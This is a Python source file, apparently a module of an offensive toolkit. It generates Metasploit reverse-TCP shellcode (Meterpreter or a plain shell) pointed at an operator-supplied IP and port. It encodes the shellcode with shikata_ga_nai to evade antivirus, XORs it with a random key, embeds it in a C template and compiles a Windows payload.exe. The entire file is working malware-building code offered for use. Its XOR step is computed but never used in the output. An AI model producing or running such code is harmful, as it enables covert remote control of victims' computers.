#!/usr/bin/python
#

import os
import subprocess
from src.core import menus
from src.core.main import *
from time import sleep
from itertools import izip, cycle

def xor_string(data,key):
	return "".join(chr(ord(x) ^ ord(y)) for (x,y) in izip(data, cycle(key)))
	
def hexlify(b):
	return "\\x%02x"*len(b) % tuple(map(ord, b))

while 1:
	try:
		
		if not os.path.exists("/usr/bin/i586-mingw32msvc-gcc"):
			PrintError("You need to have i586-mingw32msvc-gcc installed to use this module")
			EntContinue()
			break

		# set msfpath
		path = msfpath()

		# get current dir
		cwd = os.getcwd()

		# interface ip
		iface = iface_ip()

		selection = 0
		while selection != range(1,4):
			clear()
			menus.shellcode_menu()
			selection = raw_input(" %sSelection > %s" % (colours.bold, colours.reset))
			if selection == '1':
				payload = "windows/meterpreter/reverse_tcp"
				break
			if selection == '2':
				payload = "windows/shell/reverse_tcp"
				break

		# shall we encode the payload?
		menus.win_enc_menu()
		encoding = raw_input(" %sSelection > %s" % (colours.bold, colours.reset))

		#			
		# get some user info
		ip = raw_input("\n Enter your local or remote ip (%s): " % iface)
		if ip == '':
			ip = iface
		port = raw_input(" Enter a port (default 8080): ")
		if port == '':
			port = 8080
		if encoding == '1' or encoding == '':
			encoding = '1'
			iterations = raw_input(" Number of times to encode shellcode (default 10): ")
			if iterations == '':
				iterations = 10

		# create payload
		if encoding == '1':
			PrintInfo("Creating payload with x%s shikata_ga_nai. Please wait..." % iterations)
			print ""
			shellcode = os.popen("%s/msfpayload %s LHOST=%s LPORT=%s R | %s/msfencode -c %s -e x86/shikata_ga_nai -t c | tr -d '\"' | tr -d '\n' | sed 's/unsigned char buf\[\] \= //'" % (path, payload, ip, port, path, iterations)).read()
			PrintInfo("Shellcode generated")
			sleep(1)
			PrintInfo("Encoding shellcode")
			sleep(1)
		elif encoding == '2':
			PrintInfo("Creating payload. Please wait...")
			print ""
			shellcode = os.popen("%s/msfpayload %s LHOST=%s LPORT=%s C " % (path, payload, ip, port)).read()
			PrintInfo("Shellcode generated")
			sleep(1)
			PrintInfo("Encoding shellcode")
			sleep(1)

		key = generate_random_string(10, 25)
		PrintInfo("Using random key %s" % key)
		encrypted = xor_string(shellcode, key)
		xor = hexlify(encrypted)
		sleep(1)
	
		PrintInfo("Shellcode encoded")
		sleep(1)
		PrintInfo("Creating template.c")
		sleep(1)
	
		# write c file
		template = cwd+"/src/files/template.c"
		with open(template) as f:
			for line in f:
				with open('output/template.c', 'a') as f_out:
					f_out.write(line.replace('PUTSHELLCODEHERE', shellcode))
		
		# compile payload
		PrintInfo("File created. Compiling...")
		subprocess.Popen("i586-mingw32msvc-gcc -o output/payload.exe output/template.c -mwindows > /dev/null 2>&1", shell=True).wait()
		PrintInfo("File payload.exe created in the output directory")
		sleep(1)
			
		# clean up
		PrintInfo("Cleaning up...")
		os.remove('output/template.c')
			
		# return to main
		EntContinue()
		break
	except KeyboardInterrupt:
		break